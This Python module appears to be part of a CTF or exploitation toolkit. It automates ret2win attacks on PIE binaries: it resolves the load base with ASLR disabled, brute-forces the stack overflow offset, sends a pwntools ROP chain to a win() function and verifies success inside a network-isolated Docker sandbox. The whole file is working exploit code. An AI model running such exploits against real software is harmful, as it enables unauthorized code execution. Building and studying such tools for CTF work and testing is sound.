"""ret2win on PIE binaries, verified by execution.

PIE randomizes the base, so win()'s address is base+offset. With ASLR disabled in the
sandbox the base is fixed; we resolve it (io.libs / /proc maps / the standard ASLR-off PIE
base), search the stack offset and alignment, jump to win() and confirm it. For AUTHORIZED /
CTF targets. Needs the 'binoracle-pwn' image."""
from __future__ import annotations

import os
import shutil
import subprocess

_DRIVER = r'''
import sys, os
from pwn import *
elf = ELF(sys.argv[1], checksec=False); context.binary = elf; context.log_level = "error"
win_off = None
for n, a in (elf.symbols or {}).items():
    if n == "win" or n.endswith("win") or n in ("shell", "backdoor"):
        win_off = a; break
if win_off is None:
    print("NO_WIN"); sys.exit(1)
try:
    ret_off = ROP(elf).find_gadget(["ret"]).address
except Exception:
    ret_off = None
def resolve_base(io):
    for path, b in (io.libs() or {}).items():
        if os.path.basename(path) == os.path.basename(elf.path) and b:
            return b
    try:
        for line in open("/proc/%d/maps" % io.pid):
            if os.path.basename(elf.path) in line and "r-xp" in line:
                return int(line.split("-")[0], 16) & ~0xfff
    except Exception:
        pass
    return 0x555555554000
MARK = b"win reached"
for off in [72, 64, 88, 56, 96, 104, 80, 40, 120, 112, 128, 136, 48]:
    for a in (1, 0):
        io = process([elf.path], aslr=False)
        base = resolve_base(io)
        chain = b"A" * off + (p64(base + ret_off) if (a and ret_off is not None) else b"") + p64(base + win_off)
        io.sendline(chain)
        out = io.recvrepeat(1.0)
        io.close()
        if MARK in out:
            print("VERIFIED off=%d base=%#x win=%#x" % (off, base, base + win_off))
            sys.exit(0)
print("NOT_VERIFIED"); sys.exit(1)
'''


def autopie_ret2win(binary: str, run: bool = True) -> dict:
    if not shutil.which("docker"):
        return {"ok": False, "note": "docker no disponible"}
    if subprocess.run(["docker", "image", "inspect", "binoracle-pwn"],
                      capture_output=True).returncode != 0:
        return {"ok": False, "note": "falta la imagen 'binoracle-pwn' (make pwn-image)"}
    d = os.path.dirname(os.path.abspath(binary)); name = os.path.basename(binary)
    drv = os.path.join(d, ".binoracle_pie.py")
    with open(drv, "w") as f:
        f.write(_DRIVER)
    try:
        r = subprocess.run(
            ["docker", "run", "--rm", "--platform", "linux/amd64", "--network", "none",
             "--memory", "512m", "--pids-limit", "256", "--security-opt", "seccomp=unconfined",
             "-v", d + ":/w", "-w", "/w", "binoracle-pwn", "python3", ".binoracle_pie.py", name],
            capture_output=True, text=True, timeout=150)
        out = r.stdout + r.stderr
    except subprocess.TimeoutExpired:
        out = "[timeout]"
    finally:
        try: os.unlink(drv)
        except OSError: pass
    verified = "VERIFIED" in out and "NOT_VERIFIED" not in out
    line = next((l for l in out.splitlines() if l.startswith("VERIFIED")), "")
    return {"ok": True, "verified": verified, "detail": line, "output": out[-600:],
            "note": "ret2win en PIE (base resuelta, shell/win verificada en sandbox)"}
